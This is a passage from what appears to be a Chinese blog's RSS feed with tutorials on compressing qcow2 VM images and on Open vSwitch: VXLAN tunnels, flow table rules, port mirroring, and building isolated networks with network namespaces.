&lt;/code>&lt;/pre></description></item><item><title>压缩qcow2 镜像文件</title><link>https://www.typesafe.cn/posts/qcow2-image-compression/</link><pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/qcow2-image-compression/</guid><description>&lt;h1 id="压缩qcow2">压缩qcow2&lt;/h1>
&lt;p>首先，需要对虚拟机剩余空间进行写零操作：&lt;/p>
&lt;pre tabindex="0">&lt;code>dd if=/dev/zero of=/zero.dat
&lt;/code>&lt;/pre>&lt;p>删除 zero.dat：&lt;/p>
&lt;pre tabindex="0">&lt;code>rm /zero.dat
&lt;/code>&lt;/pre>&lt;p>关闭虚拟机，执行&lt;code>qemu-img&lt;/code>的&lt;code>convert&lt;/code>命令进行转换：&lt;/p>
&lt;pre tabindex="0">&lt;code>qemu-img convert -c -O qcow2 /path/old.img.qcow2 /path/new.img.qcow2
&lt;/code>&lt;/pre></description></item><item><title>Open vSwitch 入门实践（6）VXLAN实验</title><link>https://www.typesafe.cn/posts/ovs-learn-6/</link><pubDate>Wed, 30 Dec 2020 19:14:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-6/</guid><description>&lt;h1 id="什么是vxlan">什么是VXLAN？&lt;/h1>
&lt;p>VXLAN是一种隧道封装协议，在三层网络上封装二层网络数据报文。简单来说就是可以在已经规划好网络拓扑的设备上封装出一个新的二层网络，因此VXLAN这类网络又被称之为overylay网络，底下承载VXLAN网络的就被称之为underlay网络。&lt;/p>
&lt;h1 id="vxlan解决了什么问题">VXLAN解决了什么问题？&lt;/h1>
&lt;p>最近几年，阿里云，腾讯云，京东云，华为云等等厂商每到节日都会打折出售大量云服务器，1核1G内存50G磁盘的服务器几十块就能买到一年的使用权，作为一个专业的羊毛党，哪个手里没有几台小破水管机器？但是这么多的云服务器是厂商如何做隔离的呢？了解过网络的同学或许会说VLAN。但是VLAN这种只能隔离4094个虚拟网络的技术别说满足不了羊毛党了，就连正常的用户估计都撑不住。那不隔离能行吗，厂商规划一个特别大的网段，让大家都在这里面耍，正常用户还好，万一这个时候进来一个大黑客，估计就会全部GG。&lt;/p>
&lt;p>因此，隔离是必不可少的，其中关键的技术就是overlay网络。&lt;/p>
&lt;p>那VXLAN具体解决了哪些问题呢？&lt;/p>
&lt;ul>
&lt;li>突破了VLAN技术4094个隔离网络的限制，在一个管理域中创建多达1600万个VXLAN网络。&lt;/li>
&lt;li>VXLAN提供了云服务厂商所需的规模的网络分段，以支持大量租户。&lt;/li>
&lt;li>突破了物理网络边界的限制，传统虚拟二层网络（VLAN）是需要和物理网络做大量适配工作才能保证环境的迁移不会导致虚拟网络异常，overlay网络则不必关心底层物理网络是如何搭建的，只要能保证VXLAN端点相互之间可以联通即可。&lt;/li>
&lt;/ul>
&lt;h1 id="vxlan网络如何工作">VXLAN网络如何工作？&lt;/h1>
&lt;p>VXLAN隧道协议将二层以太网帧封装在三层UDP数据包中，使用户能够创建跨物理三层网络的虚拟化二层子网或网段。每个二层子网使用VXLAN网络标识符（VNI）作为唯一标识。报文格式如下图：&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan_packet_header.png" alt="VXLAN报文格式">&lt;/p>
&lt;p>执行数据包封装和解封装的实体称为VXLAN隧道终结点（VTEP）。VTEP主要分为两类：硬件VTEP和软件VTEP。硬件VTEP我接触较少，这里就不再介绍了。&lt;/p>
&lt;p>软件VTEP如下图所示：VTEP在数据包到达虚拟机之前进行了封装和解封装，使得虚拟机完全不需要知道VXLAN隧道以及它们之间的三层网络。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan01.png" alt="vxlan网络">&lt;/p>
&lt;h1 id="简单vxlan实验">简单VXLAN实验&lt;/h1>
&lt;p>我们参照下图完成实验。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vxlan_topo.png" alt="VXLAN实验">&lt;/p>
&lt;h3 id="主机a">主机A&lt;/h3>
&lt;pre tabindex="0">&lt;code># 创建隧道网桥
ovs-vsctl add-br br-tun
# 创建隧道端口并指定远端IP和VXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.232 options:key=1111
# 创建内部端口
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# 创建netns用于模拟虚拟网络设备
ip netns add ns0
# 将内部端口移动到netns中
ip link set vnet0 netns ns0
# 启动网卡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# 配置IP
ip netns exec ns0 ip addr add 192.168.0.1/24 dev vnet0
&lt;/code>&lt;/pre>&lt;h3 id="主机b">主机B&lt;/h3>
&lt;pre tabindex="0">&lt;code># 创建隧道网桥
ovs-vsctl add-br br-tun
# 创建隧道端口并指定远端IP和VXLAN ID
ovs-vsctl add-port br-tun vx01 -- set Interface vx01 type=vxlan options:remote_ip=192.168.123.231 options:key=1111
# 创建内部端口
ovs-vsctl add-port br-tun vnet0 -- set Interface vnet0 type=internal
# 创建netns用于模拟虚拟网络设备
ip netns add ns0
# 将内部端口移动到netns中
ip link set vnet0 netns ns0
# 启动网卡
ip netns exec ns0 ip link set lo up
ip netns exec ns0 ip link set vnet0 up
# 配置IP
ip netns exec ns0 ip addr add 192.168.0.2/24 dev vnet0
&lt;/code>&lt;/pre>&lt;h2 id="测试">测试&lt;/h2>
&lt;p>在&lt;code>主机A&lt;/code>上测试网络连通性 &lt;code>ip netns exec ns0 ping 192.168.0.2&lt;/code>&lt;/p></description></item><item><title>Open vSwitch 入门实践（5）OVS Flow Table 流表规则</title><link>https://www.typesafe.cn/posts/ovs-learn-5/</link><pubDate>Tue, 29 Dec 2020 18:38:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-5/</guid><description>&lt;h1 id="openvswitch-flow-table-流表">OpenvSwitch flow table 流表&lt;/h1>
&lt;blockquote>
&lt;p>OpenFlow（OF）被认为是第一个&lt;a href="https://zh.wikipedia.org/wiki/%E8%BB%9F%E4%BB%B6%E5%AE%9A%E7%BE%A9%E7%B6%B2%E7%B5%A1">软件定义网络&lt;/a>（SDN）标准之一。它最初在SDN环境中定义了通信协议，使SDN控制器能够与物理和虚拟的交换机和路由器等网络设备的转发平面直接进行交互，从而更好地适应不断变化的业务需求。&lt;/p>&lt;/blockquote>
&lt;p>如果把OpenFlow控制器比作“大脑”，OVS流表就像是“大腿”一样接受来自“大脑”的指令，决定要向哪个方向前进。但OVS流表功能更加强大，在没有OpenFlow控制器时，也可以自主工作，它本身也供一些命令让我们可以直接管理流表。&lt;/p>
&lt;h1 id="操作命令">操作命令&lt;/h1>
&lt;h3 id="查看流表规则">查看流表规则&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 查看br-tun上的全部流表规则&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl dump-flows br-tun
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="添加或修改流表规则">添加或修改流表规则&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ovs-ofctl add−flow／add−flows／mod−flows “流表匹配条件,actions&lt;span style="color:#f92672">=[&lt;/span>动作1&lt;span style="color:#f92672">][&lt;/span>,动作2…&lt;span style="color:#f92672">]&lt;/span>”
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果你有过编程的经验，流表规则其实就是一个个简单的&lt;code>if&lt;/code>语句，伪代码如下。&lt;/p>
&lt;pre tabindex="0">&lt;code>if (流表匹配条件){
	动作1，
	动作2...
}

if (流表匹配条件){
	动作1，
	动作2...
}
&lt;/code>&lt;/pre>&lt;h3 id="删除流表规则">删除流表规则&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 删除br-tun上的全部流表规则&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl del-flows br-tun
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 删除br-tun上匹配xx的全部流表规则&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-ofctl del-flows br-tun xx 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="流表匹配条件">流表匹配条件&lt;/h1>
&lt;p>OVS 流表匹配条件较多，下面我将其分成四部分来说明，分别是:&lt;/p>
&lt;ul>
&lt;li>OVS匹配条件&lt;/li>
&lt;li>OSI模型第二层【数据链路层】&lt;/li>
&lt;li>OSI模型第三层【网络层】&lt;/li>
&lt;li>OSI模型第四层【传输层】&lt;/li>
&lt;/ul>
&lt;h2 id="ovs匹配条件">OVS匹配条件&lt;/h2>
&lt;h3 id="in_portport">in_port=port&lt;/h3>
&lt;p>流量进入的端口编号或者名称，示例 &lt;code>in_port=br-int&lt;/code>&lt;/p>
&lt;h3 id="tablenumber">table=number&lt;/h3>
&lt;p>规则保存的流表编号，范围是 0-254，默认值：0。&lt;/p>
&lt;h2 id="osi模型第二层数据链路层">OSI模型第二层【数据链路层】&lt;/h2>
&lt;p>&lt;em>&lt;code>dl&lt;/code> 即是 &lt;code>data link&lt;/code> 的缩写。&lt;/em>&lt;/p>
&lt;h3 id="dl_typeethertype">dl_type=ethertype&lt;/h3>
&lt;p>匹配以太网协议类型以太类型，以10到65535之间的整数（包括0和65535）指定，以十进制或以0x前缀的十六进制数表示，示例如下。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>dl_type=0x0800&lt;/code> 匹配IPv4数据包，等同于&lt;code>dl_type=ip&lt;/code> 。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x086dd&lt;/code> 匹配IPv6数据包，等同于&lt;code>dl_type=ipv6&lt;/code> 。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x0806&lt;/code> 匹配ARP数据包，等同于&lt;code>dl_type=arp&lt;/code> 。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>dl_type=0x8035&lt;/code> 匹配RARP数据包，等同于 &lt;code>dl_type=rarp&lt;/code>。&lt;/p></description></item><item><title>Open vSwitch 入门实践（4）使用OVS配置端口镜像</title><link>https://www.typesafe.cn/posts/ovs-learn-4/</link><pubDate>Mon, 28 Dec 2020 19:23:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-4/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>当我们想要在不影响虚拟网络设备数据报文收发的情况下获取对应虚拟网络设备的流量时，端口镜像是一个很好的选择。端口镜像是指将经过指定端口（镜像端口）的报文复制一份到另一个指定端口（观察端口），通过观察端口接收到的数据报文，就可以有效识别虚拟网络的运行情况。&lt;/p>
&lt;p>OVS提供了相关命令来配置或删除端口镜像，下面我们来实验一下。&lt;/p>
&lt;h1 id="如何使用">如何使用&lt;/h1>
&lt;h3 id="端口镜像类型">端口镜像类型&lt;/h3>
&lt;p>端口镜像分为镜像源和镜像目的两部分。&lt;/p>
&lt;h4 id="镜像源">镜像源&lt;/h4>
&lt;ul>
&lt;li>select_all：布尔类型（true，false）。设置为 true 时，表示此网桥上的所有流量。&lt;/li>
&lt;li>select_dst_port：字符串（端口名称）。表示此端口接收的所有流量。&lt;/li>
&lt;li>select_src_port：字符串（端口名称）。表示此端口发送的所有流量。&lt;/li>
&lt;li>select_vlan：整型（0-4095）。表示携带此VLAN标签的流量。&lt;/li>
&lt;/ul>
&lt;h4 id="镜像目的">镜像目的&lt;/h4>
&lt;ul>
&lt;li>output_port：字符串（端口名称）。接收流量报文的观察端口。&lt;/li>
&lt;li>output_vlan：整型（0-4095）。表示只修改VLAN标签，原VLAN标签会被剥离。&lt;/li>
&lt;/ul>
&lt;h3 id="基础操作命令">基础操作命令&lt;/h3>
&lt;p>新增端口镜像&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl -- set Bridge &amp;lt;bridge_name&amp;gt; mirrors&lt;span style="color:#f92672">=&lt;/span>@m &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -- --id&lt;span style="color:#f92672">=&lt;/span>@&amp;lt;port0&amp;gt; get Port &amp;lt;port0&amp;gt; &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -- --id&lt;span style="color:#f92672">=&lt;/span>@&amp;lt;port1&amp;gt; get Port &amp;lt;port1&amp;gt; &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -- --id&lt;span style="color:#f92672">=&lt;/span>@m create Mirror name&lt;span style="color:#f92672">=&lt;/span>&amp;lt;mirror_name&amp;gt; &lt;span style="color:#66d9ef">select&lt;/span>-dst-port&lt;span style="color:#f92672">=&lt;/span>@&amp;lt;port0&amp;gt; &lt;span style="color:#66d9ef">select&lt;/span>-src-port&lt;span style="color:#f92672">=&lt;/span>@&amp;lt;port0&amp;gt; output-port&lt;span style="color:#f92672">=&lt;/span>@&amp;lt;port1&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>这行命令会输出一个镜像ID&lt;/p>&lt;/blockquote>
&lt;p>删除端口镜像&lt;/p>
&lt;pre tabindex="0">&lt;code>ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&amp;gt;
&lt;/code>&lt;/pre>&lt;p>在原端口镜像的基础上增加一个镜像源&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 获取端口的ID&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl get port &amp;lt;port_name&amp;gt; _uuid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 在原端口镜像的基础上增加镜像源&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_src_port &amp;lt;port-id&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_dst_port &amp;lt;port-id&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在原端口镜像的基础上删除一个镜像源&lt;/p></description></item><item><title>Open vSwitch 入门实践（3）使用OVS构建分布式隔离网络</title><link>https://www.typesafe.cn/posts/ovs-learn-3/</link><pubDate>Sun, 27 Dec 2020 11:38:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-3/</guid><description>&lt;h1 id="使用ovs构建分布式隔离网络">使用OVS构建分布式隔离网络&lt;/h1>
&lt;h2 id="前言">前言&lt;/h2>
&lt;p>上一节我们使用OVS构建了单机隔离网络，但是随着网络规模的扩张，单节点已经不再能满足业务的需要，分布式网络成了必不可少的环节。分布式网络与单节点网络在细节实现上基本一致，只有物理环境网络连线上的一点区别。&lt;/p>
&lt;h2 id="实验1分布式无隔离网络">实验1：分布式无隔离网络&lt;/h2>
&lt;p>网络拓扑如下图所示，我们每一台节点都有两张网卡，一张用于管理，一张用于业务。之所以使用两张网卡有两个原因：&lt;/p>
&lt;ol>
&lt;li>管理网卡用于日常的维护登录，业务网卡用于传输虚拟节点的数据报文，避免相互之间影响。&lt;/li>
&lt;li>我们要将业务网卡绑定到OVS网桥上，也就是&lt;code>Normal&lt;/code>类型的&lt;code>Port&lt;/code>。这种方式添加的&lt;code>Port&lt;/code>不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>需要注意的是，如果是使用物理环境搭建网络拓扑，需要把业务网卡对应的交换机端口配置为&lt;code>trunk&lt;/code>模式。如果是使用VmWare搭建网络拓扑，业务网卡需要配置网络类型为&lt;code>仅主机模式&lt;/code>。&lt;/p>&lt;/blockquote>
&lt;p>&lt;img src="https://oss.typesafe.cn/ovs-di-network0.png?t=2" alt="分布式无隔离网络">&lt;/p>
&lt;h3 id="配置">配置&lt;/h3>
&lt;ul>
&lt;li>配置环境 &lt;code>主机A&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 请修改eth1为当前实验环境的业务网卡名称&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加两个内部端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加两个netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将内部端口分别移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 启动端口并配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>配置环境 &lt;code>主机B&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 请修改eth1为当前实验环境的业务网卡名称&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int eth1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加两个内部端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加两个netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将内部端口分别移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 启动端口并配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip addr add 10.0.0.3/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip addr add 10.0.0.4/24 dev vnet1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="测试">测试&lt;/h3>
&lt;ul>
&lt;li>测试 &lt;code>主机A&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ping 10.0.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ping 10.0.0.4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ping 10.0.0.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ping 10.0.0.4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>测试 &lt;code>主机B&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ping 10.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ping 10.0.0.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ping 10.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ping 10.0.0.2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>测试结果&lt;/li>
&lt;/ul>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>主机A&lt;/th>
 &lt;th>主机B&lt;/th>
 &lt;th>ping 结果&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ns0&lt;/td>
 &lt;td>ns0&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns0&lt;/td>
 &lt;td>ns1&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns1&lt;/td>
 &lt;td>ns0&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ns1&lt;/td>
 &lt;td>ns1&lt;/td>
 &lt;td>可通信 ✅&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>根据测试结果可以看到我们使用OVS成功的联通了分布在不同主机上的虚拟网络设备。&lt;/p></description></item><item><title>Open vSwitch 入门实践（2）使用OVS构建隔离网络</title><link>https://www.typesafe.cn/posts/ovs-learn-2/</link><pubDate>Thu, 26 Nov 2020 22:55:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/ovs-learn-2/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>在前面我们已经使用Linux Bridge完成了多台网络设备的通信，但是它对于网络隔离的支持不是很好，长期以来，在Linux平台上缺少一个功能完备的虚拟交换机，直到OVS的出现。&lt;/p>
&lt;h1 id="实验">实验&lt;/h1>
&lt;p>接下来我们来尝试完成两个实验，单机无隔离网络、单机隔离网络。&lt;/p>
&lt;h2 id="实验一单机无隔离网络">实验一：单机无隔离网络&lt;/h2>
&lt;p>使用ovs构建无隔离网络非常简单，只需要添加一个网桥，然后在这个网桥上再增加几个内部端口，最后把端口移动到netns中即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加网桥&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-int
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加三个内部端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type&lt;span style="color:#f92672">=&lt;/span>internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 添加三个netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将内部端口分别移动到netns中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet1 netns ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link set vnet2 netns ns2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 启动端口并配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip link set vnet0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip link set vnet1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns2 ip link set lo up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns2 ip link set vnet2 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns exec ns2 ip addr add 10.0.0.3/24 dev vnet2
